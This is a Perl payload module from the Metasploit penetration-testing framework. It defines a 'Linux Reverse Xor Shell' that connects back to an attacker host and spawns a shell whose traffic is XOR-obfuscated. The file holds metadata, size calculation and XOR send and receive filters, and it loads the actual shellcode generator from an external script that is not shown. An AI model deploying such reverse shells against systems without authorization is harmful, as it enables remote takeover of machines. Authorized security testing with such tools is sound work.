
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Payload::linx86_reverse_xor;
use strict;
use base 'Msf::PayloadComponent::InlineEggPayload';
sub load {
  Msf::PayloadComponent::InlineEggPayload->import('Msf::PayloadComponent::ReverseConnection');
}

my $info =
{
  'Name'         => 'Linux Reverse Xor Shell',
  'Version'      => '$Revision$',
  'Description'  => 'Connect back to attacker and spawn an encrypted shell',
  'Authors'      => [ 'gera[at]corest.com [InlineEgg License]', ],
  'Arch'         => [ 'x86' ],
  'Priv'         => 0,
  'OS'           => [ 'linux' ],
  'Size'         => 0,
  'UserOpts'     =>
    {
      'XKEY'  => [1, 'BYTE',  'Byte to xor the connection with', 0x69],
    }
};

sub new {
  load();
  my $class = shift;
  my $hash = @_ ? shift : { };
  $hash = $class->MergeHashRec($hash, {'Info' => $info});
  my $self = $class->SUPER::new($hash, @_);

  $self->{'Filename'} = $self->ScriptBase . '/payloads/external/linx86reverse_xor.py';
  $self->_Info->{'Size'} = $self->_GenSize;
  return($self);
}

sub _GenSize {
  my $self = shift;
  my $bin = $self->Generate({'LHOST' => '127.0.0.1', 'LPORT' => '4444', 'XKEY' => '55'});
  return(length($bin));
}

sub RecvFilter {
  my $self = shift;
  my $data = shift;
  my $xkey = $self->GetVar('XKEY');
  $data = Pex::Encoder::XorByte($xkey, $data);
  return($data);
}

sub SendFilter {
  my $self = shift;
  my $data = shift;
  return($self->RecvFilter($data));
}

1;
